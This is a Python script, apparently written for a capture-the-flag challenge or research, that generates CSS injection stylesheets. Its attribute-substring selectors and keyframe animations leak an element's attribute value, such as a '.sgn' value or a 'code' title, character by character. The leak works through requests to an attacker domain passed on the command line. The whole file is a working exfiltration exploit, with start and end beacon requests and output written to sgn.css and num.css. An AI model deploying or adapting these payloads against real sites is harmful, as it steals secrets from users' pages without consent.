import string
import itertools 
import sys
import math 
import os 

URL_TYPES = [
    'background',
    'list-style',
    'border-image',
    'cursor',
    # 'filter',
    # 'shape-outside',
    # '-webkit-mask',
    # 'content',
]

SELECTOR_TYPES = [
    '',
    '::after',
    '::before',
    # '::first-line',
]

VARIABLES = {}


DURATION = 8
START_DELAY = 1

def add_variable(variable):
    if variable.name in VARIABLES:
        raise Exception('trying to add existing variable')
    VARIABLES[variable.name] = variable

def remove_variable(variable):
    if variable.name in VARIABLES:
         del VARIABLES[variable.name]

class Variable:
    def __init__(self, name, stype, urltype):
        self.stype = stype
        self.urltype = urltype
        self.name = name

class Selector:
    def __init__(self,selector, attr, word, var, domain):
        self.selector = selector
        self.pseudo = VARIABLES[var].stype
        self.variable = VARIABLES[var].name
        self.domain = domain
        self.word = word
        self.urltype=VARIABLES[var].urltype
        self.attribute = attr
    def __str__(self):
        s = '''{selector}[{attr}*="{word}"]{pseudo}{{--{var}:url(//{domain}/{word}){suffix}}}'''
        suffix = ',none' if self.urltype == 'cursor' else ''
        s = s.format(selector=self.selector, pseudo=self.pseudo, word=self.word, var=self.variable, 
        domain=self.domain, suffix=suffix, attr=self.attribute)
        return s
        

class KeyframeSingle:
    def __init__(self, var):
        self.urltype = VARIABLES[var].urltype
        self.variable = VARIABLES[var].name
    def __str__(self):
        s = '''{urltype}:var(--{var})'''
        s = s.format(urltype=self.urltype, var=self.variable)
        return s

class Keyframes:
    def __init__(self, name, pseudo, selector):
        self.name = name
        self.iterator = 0
        self.steps = [] # List of [KeyframeSingle]
        self.pseudo = pseudo
        self.selector = selector
    def add_frames(self, frames):
        self.steps.append((self.iterator, frames))
        self.iterator += 1
    def generate_animations(self):
        n = int(math.ceil(self.iterator / 100.))
        animations = []
        
        for i in range(n):
            animations.append('{name}{i} {duration}s {delay}s'.format(name=self.name,i=i,duration=DURATION,delay=i*DURATION + START_DELAY))
        return '{selector}{pseudo}{{animation: {animations}}}'.format(
            selector = self.selector,
            pseudo = self.pseudo,
            animations =','.join(animations)
        )

    def generate_step(self, step):
        i, frames = step
        frames = map(lambda x: str(x), frames)
        return '{step}%{{{frames}}}'.format(step=i%100, frames=';'.join(frames))
    def generate_empty_step(self, step):
        empty = ';'.join(list(map(lambda x: x+":none", URL_TYPES)))
        return '{step}%{{{empty}}}'.format(step=step, empty=empty)

    def generate_frames(self):
        n = int(math.ceil(self.iterator / 100.))
        frames = ''
        for i in range(n):
            body = self.steps[i*100:(i+1)*100]
            body = list(map(self.generate_step, body))
            body.append(self.generate_empty_step(len(body)))
            body = '\n'.join(body)
            frames += '@keyframes {name}{{\n{body}}}\n'.format(name=self.name+str(i), body=body)
        return frames

    

def tests():
    a0 = Variable('p_test', '::after', 'cursor')
    a1 = Variable('p_test2', '::after', 'content')
    a2 = Variable('p_test3', '::after', 'background')

    add_variable(a0)
    add_variable(a1)
    add_variable(a2)

    k0,k1,k2 = KeyframeSingle('p_test'), KeyframeSingle('p_test2'), KeyframeSingle('p_test3')
    x = Selector('input', 'xyz', 'p_test', 'terjanq.cf')
    assert str(x) == 'input[value*="xyz"]::after{--p_test:url(//terjanq.cf/xyz),none}', x
    x = KeyframeSingle('p_test')
    assert str(x) == 'cursor:var(--p_test)', x

    x = Keyframes('loop', '::after')
    for _ in range(0, 101): x.add_frames([k0,k1,k2])
    print(x.generate_animations())


# tests()


alph = 'abcdef0123456789'
# alph = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
# alph = string.ascii_lowercase


def generate_starting_rules(selector):
    return "{s}{{display:block}}\n{s}::after,{s}::before{{content:''}}\n".format(s=selector)

def generate_boundries(domain, delay):
    res = "body{background:url(//%s/start);animation:bound 1s %ds}\n" %(domain, delay)
    res += "@keyframes bound{100%%{content:url(//%s/end)}}" % domain
    return res

def generate_css(selector, attribute, domain, char_len, alph = 'abcdef0123456789', duration = 8, start_delay=1, end_time=10):
    global VARIABLES, DURATION, START_DELAY
    SELECTORS = []
    VARIABLES = {}
    DURATION = duration
    START_DELAY = start_delay
    KEYFRAMES = [Keyframes('loop', '', selector), Keyframes('aloop', '::after', selector), Keyframes('bloop', '::before', selector)]
    WORDS = list(map(lambda x: ''.join(x), itertools.product(alph, repeat=char_len)))[::-1]
    COUNTER = 0
    while len(WORDS) > 0:
        for i in range(len(SELECTOR_TYPES)):
            frames = []
            stype = SELECTOR_TYPES[i]
            for j in range(len(URL_TYPES)):
                if len(WORDS) == 0:
                    break
                word = WORDS.pop()
                var = 'p_%d' % COUNTER
                urltype = URL_TYPES[j]
                add_variable(Variable(var,stype,urltype))
                SELECTORS.append(Selector(selector, attribute, word, var, domain))
                frames.append(KeyframeSingle(var))
                COUNTER+=1
            if frames: KEYFRAMES[i].add_frames(frames)
    res = generate_starting_rules(selector) + '\n'
    res += generate_boundries(domain, end_time) + '\n\n'
    res += '\n'.join(map(lambda x: str(x), SELECTORS)) + '\n\n'
    res += '\n'.join(map(lambda x: x.generate_animations(), KEYFRAMES)) + '\n\n'
    res += '\n'.join(map(lambda x: x.generate_frames(), KEYFRAMES)) + '\n\n'
    return res

if __name__ == '__main__':
    DOMAIN = sys.argv[1]
    sgn = generate_css('.sgn','value',DOMAIN+'/s',3,'abcdef0123456789',6,1,28)
    num = generate_css('code','title',DOMAIN+'/c',2,'0123456789',8,1,4)
    open('sgn.css', "w").write(sgn)
    open('num.css', "w").write(num)
